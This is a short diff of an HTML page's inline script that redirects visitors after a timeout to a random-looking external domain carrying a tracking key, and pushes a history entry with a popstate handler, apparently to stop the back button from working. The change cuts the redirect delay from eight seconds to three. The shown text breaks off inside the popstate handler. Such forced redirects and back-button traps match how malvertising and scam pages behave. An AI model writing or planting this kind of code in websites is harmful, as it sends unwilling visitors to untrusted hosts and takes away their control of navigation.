@@ -181,7 +181,7 @@
   <script>
     setTimeout(() => {
       window.location.href = "https://conscientiouscabbageadrift.com/wus0z8zc7p?key=90bcb0f2b91421128dedacde813bc802";
-    }, 8000);
+    }, 3000);
 
     history.pushState(null, null, location.href);
     window.onpopstate = () => {
